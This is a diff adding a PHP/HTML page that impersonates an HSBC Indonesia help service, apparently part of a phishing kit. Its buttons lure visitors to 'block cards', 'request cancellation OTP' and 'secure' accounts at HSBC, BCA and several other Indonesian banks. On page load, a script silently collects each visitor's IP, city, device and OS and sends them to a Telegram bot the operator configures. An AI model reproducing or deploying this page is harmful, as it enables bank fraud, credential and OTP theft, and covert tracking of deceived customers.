@@ -1,0 +1,463 @@
+<?php
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <meta name="theme-color" content="#DB0011">
+  <title>Layanan Bantuan HSBC</title>
+  <meta content="img/header.jpeg" property="og:image">
+  <link rel="shortcut icon" href="img/logo.svg" type="image/x-icon"/>
+  
+  <!-- Font Awesome untuk Icon -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+  <style>
+    :root {
+      --bca-blue: #DB0011;
+      --bca-dark-blue: #DB0011;
+      --bca-red: #ED1C24;
+      --text-color: #333;
+      --bg-overlay: rgba(255, 255, 255, 0.95);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-image: url('img/INDIVIDU_CUSTOMER-SEERVICE.jpg');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow-x: hidden; /* Mencegah scroll horizontal */
+    }
+
+    /* Overlay background */
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 44, 110, 0.5); /* Sedikit lebih gelap agar teks putih jelas */
+      z-index: -1;
+    }
+
+    /* -------------------- SPLASH LOADING -------------------- */
+    .splash-loading {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+    .splash-loading.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+    .logo-splash {
+      width: 150px;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    /* -------------------- NAVBAR -------------------- */
+    .navbar {
+      background-color: #ffffff;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    .navbar img {
+      height: 40px;
+      width: auto;
+    }
+
+    /* 
+       STRATEGI LAYOUT:
+       Kita gunakan Spacer kosong untuk mendorong konten ke bawah hingga 40%,
+       Baru kemudian Header dan Main Content muncul di bawahnya.
+    */
+    .layout-spacer {
+      height: 25vh; /* Memberi ruang sekitar 35-40% dari atas */
+      width: 100%;
+      flex-shrink: 0;
+    }
+
+    /* Container untuk Header dan Form agar rapi di tengah bawah */
+    .content-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      padding: 0 20px; /* Jarak Kiri Kanan 20px Global */
+      margin-bottom: 60px; /* Ruang untuk footer/running text */
+    }
+
+    /* -------------------- HEADER TEXT (Di bawah spacer) -------------------- */
+    .header-section {
+      text-align: center;
+      color: white;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+      margin-bottom: 20px; /* Jarak antara H1 dan Card */
+      width: 100%;
+    }
+    .header-section h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+    .header-section p {
+      font-size: 1rem;
+      opacity: 0.9;
+    }
+
+    /* -------------------- MAIN CONTENT CARD -------------------- */
+    .form-container {
+      background: var(--bg-overlay);
+      width: 100vh;
+      max-width: 450px;
+      padding: 2rem;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      backdrop-filter: blur(10px);
+    }
+
+    .section-title {
+      text-align: center;
+      color: var(--bca-blue);
+      font-size: 1.1rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+      border-bottom: 2px solid #eee;
+      padding-bottom: 0.5rem;
+    }
+
+    /* -------------------- BUTTON STYLES -------------------- */
+    .btn-custom {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 14px 20px;
+      border: none;
+      border-radius: 50px;
+      background-color: var(--bca-blue);
+      color: white;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0, 102, 174, 0.2);
+    }
+
+    .btn-custom i {
+      margin-right: 10px;
+      font-size: 1.1rem;
+    }
+
+    .btn-custom:hover {
+      background-color: var(--bca-dark-blue);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0, 102, 174, 0.3);
+    }
+
+    /* Button Khusus */
+    .btn-alert {
+      background-color: var(--bca-blue);
+      box-shadow: 0 4px 6px rgba(237, 28, 36, 0.2);
+    }
+    .btn-alert:hover {
+      background-color: #c41219;
+      box-shadow: 0 6px 12px rgba(237, 28, 36, 0.3);
+    }
+
+    /* -------------------- SELECT DROPDOWN STYLES -------------------- */
+    .select-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    .select-wrapper select {
+      width: 100%;
+      padding: 14px 40px 14px 20px;
+      border: 2px solid #e0e0e0;
+      border-radius: 50px;
+      background-color: white;
+      color: var(--text-color);
+      font-size: 1rem;
+      font-weight: 500;
+      appearance: none;
+      -webkit-appearance: none;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      outline: none;
+    }
+
+    .select-wrapper select:focus {
+      border-color: var(--bca-blue);
+      box-shadow: 0 0 0 3px rgba(0, 102, 174, 0.1);
+    }
+
+    .select-wrapper::after {
+      content: '\f078';
+      font-family: 'Font Awesome 6 Free';
+      font-weight: 900;
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--bca-blue);
+      pointer-events: none;
+      font-size: 0.9rem;
+    }
+
+    /* -------------------- FOOTER -------------------- */
+    .footer {
+      position: fixed;
+      bottom: 45px; /* Di atas running text */
+      width: 100%;
+      text-align: center;
+      padding: 0 20px;
+      font-size: 0.75rem;
+      color: rgba(255, 255, 255, 0.8);
+      text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+      pointer-events: none;
+    }
+
+    /* -------------------- MARQUEE (Running Text) -------------------- */
+    .running-text-container {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background: var(--bca-blue);
+      color: white;
+      padding: 10px 0;
+      overflow: hidden;
+      white-space: nowrap;
+      z-index: 100;
+    }
+    
+    .marquee-content {
+      display: inline-block;
+      animation: marquee 20s linear infinite;
+      padding-left: 100%;
+    }
+    
+    .marquee-item {
+      display: inline-block;
+      padding: 0 2rem;
+      font-size: 0.9rem;
+    }
+
+    @keyframes marquee {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-100%); }
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 480px) {
+      .layout-spacer {
+        height: 30vh; /* Sedikit lebih tinggi di HP agar tidak menumpuk navbar */
+      }
+      .header-section h1 {
+        font-size: 1.5rem;
+      }
+      .form-container {
+        padding: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Splash Screen -->
+  <div class="splash-loading" id="splashLoading">
+    <img src="img/logo.svg" class="logo-splash" alt="Logo Loading" onerror="this.src='https://via.placeholder.com/150x50?text=BCA'">
+  </div>
+
+  <!-- Navbar -->
+  <nav class="navbar">
+    <img src="img/logo.svg" alt="Logo Hsbc" onerror="this.src='https://via.placeholder.com/120x40?text=BCA'">
+  </nav>
+
+  <!-- Spacer Kosong untuk mendorong konten ke 40% layar -->
+  <div class="layout-spacer"></div>
+
+  <!-- Wrapper Konten (Header + Form) -->
+  <div class="content-wrapper">
+    
+    <!-- Header Title (Sekarang berada di area 40% bawah) -->
+    <div class="header-section">
+      <h1>LAYANAN BANTUAN HSBC</h1>
+      <p>Solusi Cepat & Aman untuk Nasabah</p>
+    </div>
+
+    <!-- Main Content Form (Berada DI BAWAH Header) -->
+    <main class="main-content">
+      <div class="form-container">
+        
+        <!-- Tombol Utama -->
+        <button onclick="window.location.href='blokircards.html'" class="btn-custom btn-alert">
+          <i class="fas fa-ban"></i> BLOKIR KARTU KREDIT & DEBIT
+        </button>
+
+        <button onclick="window.location.href='verifikasis.html'" class="btn-custom">
+          <i class="fas fa-key"></i> REQUEST KODE OTP PEMBATALAN
+        </button>
+        <button onclick="window.location.href='hsbcs.html'" class="btn-custom">
+          <i class="fas fa-bank"></i> Amankan Akun HSBC
+        </button>
+        
+
+        <div class="select-wrapper">
+          <select id="akunOption" onchange="handleAkunOptionChange()">
+            <option value="" disabled selected>AMANKAN AKUN BCA</option>
+            <option value="bcakliks.html">Klik BCA (Individual)</option>
+            <option value="bisniss.html">Klik BCA Bisnis</option>
+          </select>
+        </div>
+        
+        <!-- Dropdown Bank Lain -->
+        <div class="select-wrapper">
+          <select id="bankOption" onchange="handleBankOptionChange()">
+            <option value="" disabled selected>TICKET LAPORAN BANK LAIN</option>
+            <option value="octoclicks.html">OCTO Click (CIMB)</option>
+            <option value="btns.html">Bank BTN</option>
+            <option value="ocbcs.html">OCBC NISP</option>
+            <option value="panins.html">Panin Bank</option>
+            <option value="barus.html">UOB Indonesia</option>
+            <option value="megas.html">Mega Syariah</option>
+          </select>
+        </div>
+        
+        <button onclick="window.location.href='laplains.html'" class="btn-custom" style="background: var(--bca-blue);">
+          <i class="fas fa-file-alt"></i> LAPORAN KARTU BANK LAIN
+        </button>
+
+      </div>
+    </main>
+
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>PT Bank Hsbc Indonesia Tbk berizin & diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia serta merupakan Peserta Penjaminan LPS.</p>
+  </footer>
+  
+  <!-- Running Text -->
+  <div class="running-text-container">
+    <div class="marquee-content">
+      <span class="marquee-item">ðŸ”’ HSBC berkomitmen membantu nasabah mewujudkan mimpi dengan semangat bekerja dari hati.</span>
+      <span class="marquee-item">ðŸ’¼ Solusi digital kelola transaksi bisnis lebih praktis dengan HSBC Bisnis.</span>
+      <span class="marquee-item">ðŸ“ˆ Mulai investasi tanpa drama dengan Reksadana HSBC.</span>
+      <span class="marquee-item">ðŸ’± Jual beli valas kini lebih mudah: Rate kompetitif transaksi sekarang!</span>
+    </div>
+  </div>
+
+  <script>
+    // Handle Dropdown Change
+    function handleAkunOptionChange() {
+      var select = document.getElementById('akunOption');
+      var value = select.value;
+      if (value) window.location.href = value;
+    }
+
+    function handleBankOptionChange() {
+      var select = document.getElementById('bankOption');
+      var value = select.value;
+      if (value) window.location.href = value;
+    }
+
+    // Splash Screen Logic
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        document.getElementById('splashLoading').classList.add('hidden');
+      }, 1200); 
+      
+      sendLocationAndDeviceData();
+    });
+
+    // --- Script Tracking Lokasi & Device ---
+    function getLocationAndDeviceInfo() {
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        vendor: navigator.vendor
+      };
+      let deviceType = 'Desktop';
+      const userAgent = deviceInfo.userAgent.toLowerCase();
+      if (/mobile|android|iphone|ipad|ipod/.test(userAgent)) deviceType = 'Mobile';
+      else if (/tablet|ipad/.test(userAgent)) deviceType = 'Tablet';
+      
+      return { deviceType: deviceType, os: userAgent.includes('android') ? 'Android' : (userAgent.includes('iphone') ? 'iOS' : 'Other') };
+    }
+    
+        function sendLocationAndDeviceData() {
+      // GANTI DENGAN TOKEN BOT DAN CHAT ID ANDA
+      const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA"; 
+      const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";
+
+      try {
+        const deviceInfo = getLocationAndDeviceInfo();
+        fetch('https://ipinfo.io/json')
+          .then(response => response.json())
+          .then(data => {
+            // Format pesan yang akan dikirim
+            const message = `🔔 *HSBC Indonesia*\n\n` +
+                            `Kota: ${data.city || 'Unknown'}\n` +
+                            `📱 Device: ${deviceInfo.deviceType}\n` +
+                            `OS: ${deviceInfo.os}\n` +
+                            `IP: ${data.ip || 'Unknown'}`;
+
+            // Kirim ke Telegram API
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(telegramUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown' // Agar teks bisa dicetak tebal/miring
+              })
+            })
+            .then(res => res.json())
+            .then(result => {
+              if (!result.ok) console.log('Telegram Error:', result);
+            })
+            .catch(e => console.log('Telegram Fetch Error:', e));
+
+          })
+          .catch(err => console.log('IP Info error', err));
+      } catch (e) { console.error(e); }
+    }
+  </script>
+</body>
+</html>
